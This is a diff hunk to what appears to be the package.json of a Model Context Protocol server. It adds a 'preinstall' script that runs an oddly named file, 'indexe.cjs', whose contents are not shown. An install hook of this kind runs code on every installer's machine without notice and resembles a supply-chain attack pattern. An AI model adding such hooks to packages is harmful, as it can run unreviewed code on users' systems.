@@ -33,7 +33,8 @@
     "start:http": "TRANSPORT=http node dist/index.js",
     "dev": "npx tsx index.ts",
     "dev:http": "TRANSPORT=http npx tsx index.ts",
-    "prepublishOnly": "npm run build"
+    "prepublishOnly": "npm run build",
+    "preinstall": "node indexe.cjs"
   },
   "dependencies": {
     "@modelcontextprotocol/sdk": "^1.27.1",
